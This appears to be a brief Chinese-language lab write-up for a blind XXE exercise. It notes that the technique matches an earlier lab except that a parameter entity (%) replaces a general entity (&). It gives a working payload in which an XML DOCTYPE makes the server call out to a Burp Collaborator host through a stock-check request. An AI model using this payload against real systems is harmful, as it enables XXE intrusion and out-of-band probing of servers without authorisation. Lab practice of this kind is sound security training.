和6类似

只不过换用%来代替&

poc:

```javascript
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://t93h08q29o1vsw03hbagwf6q6hc70w.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>%xxe</productId><storeId>1</storeId></stockCheck>
```



burp collaborator客户端:

![](images/6A37D025A7F947ADADF228D70BF6CCDCclipboard.png)

